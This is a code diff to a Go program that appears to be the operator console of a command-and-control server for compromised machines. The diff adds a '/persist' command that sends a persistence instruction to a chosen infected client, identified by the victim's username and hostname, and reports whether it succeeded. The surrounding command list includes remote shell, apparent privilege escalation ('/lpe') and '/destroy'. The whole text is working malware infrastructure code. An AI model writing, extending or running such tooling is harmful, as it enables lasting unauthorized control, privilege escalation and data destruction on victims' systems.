@@ -408,6 +408,40 @@ func main() {
 				}
 			}
 
+		case "/persist":
+			if len(parts) < 2 {
+				fmt.Println("usage: /persist <client_id>")
+				continue
+			}
+			id, err := strconv.Atoi(parts[1])
+			if err != nil {
+				fmt.Println("invalid client id")
+				continue
+			}
+			c, ok := clients[id]
+			if !ok {
+				fmt.Printf("client %d not found\n", id)
+				continue
+			}
+			fmt.Printf("%s[*] persisting client %d (%s@%s)...%s\n",
+				colorCyan, c.ID, c.Recon.Username, c.Recon.Hostname, colorReset)
+			if err := sendCommand(c, "persist"); err != nil {
+				fmt.Printf("failed to send command: %v\n", err)
+				continue
+			}
+			var msg struct {
+				Status string `json:"status"`
+				Error  string `json:"error,omitempty"`
+				Detail string `json:"detail,omitempty"`
+			}
+			if err := c.Decoder.Decode(&msg); err != nil {
+				fmt.Printf("connection lost: %v\n", err)
+			} else if msg.Status == "persisted" {
+				fmt.Printf("%s[+] %s%s\n", colorGreen, msg.Detail, colorReset)
+			} else if msg.Status == "persist_fail" {
+				fmt.Printf("%s[-] persist failed: %s%s\n", colorRed, msg.Error, colorReset)
+			}
+
 		case "/shell":
 			if len(parts) < 2 {
 				if len(clients) == 1 {
@@ -563,7 +597,7 @@ func main() {
 
 		default:
 			fmt.Printf("unknown command: %s\n", cmd)
-			fmt.Println("commands: /clients, /check <id>, /shell <id>, /lpe <id>, /destroy <id>, /clear, /done")
+			fmt.Println("commands: /clients, /check <id>, /persist <id>, /shell <id>, /lpe <id>, /destroy <id>, /clear, /done")
 		}
 	}
 }
